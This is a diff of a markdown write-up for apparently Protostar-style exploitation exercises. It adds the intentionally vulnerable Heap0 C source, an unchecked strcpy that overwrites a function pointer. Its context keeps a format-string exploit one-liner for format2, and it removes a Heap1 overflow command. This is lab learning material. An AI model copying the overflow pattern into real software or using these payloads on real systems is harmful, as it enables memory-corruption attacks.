@@ -20,7 +20,6 @@ NOTE: write ups in progress. Adding python exploit poc's to each excercise for p
 |[Format1](#format1)|
 |[Format2](#format2)|
 |[Heap0](#Heap0)|
-|[Heap1](#Heap1)|
 |[net0](#net0)|
 |[net1](#net1)|
 |[net2](#net2)|
@@ -1353,11 +1352,50 @@ python -c 'print "\xe4\x96\x04\x08"+"%59x."+"%4$n"' | ./format2
 ```
 
 
-##Heap1
+##Heap0
 ---------------------------------------
 ###Source Code:
 ```C
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+#include <sys/types.h>
 
+struct data {
+  char name[64];
+};
+
+struct fp {
+  int (*fp)();
+};
+
+void winner()  // our target function
+{
+  printf("level passed\n");
+}
+
+void nowinner()
+{
+  printf("level has not been passed\n");
+}
+
+int main(int argc, char **argv)
+{
+  struct data *d;
+  struct fp *f;
+
+  d = malloc(sizeof(struct data));
+  f = malloc(sizeof(struct fp));
+  f->fp = nowinner;
+
+  printf("data is at %p, fp is at %p\n", d, f);
+
+  strcpy(d->name, argv[1]);
+  
+  f->fp();
+
+}
 ```
 
 ###Plan:
@@ -1365,7 +1403,6 @@ python -c 'print "\xe4\x96\x04\x08"+"%59x."+"%4$n"' | ./format2
 
 ###winning command:
 ```bash
-./heap1 $(python -c "print 'a'*20+'\x2c\xd6\xff\xff'") $(python -c "print '\x94\x84\x04\x08'") 
 ```
 ###Python exploit:
 ```Python
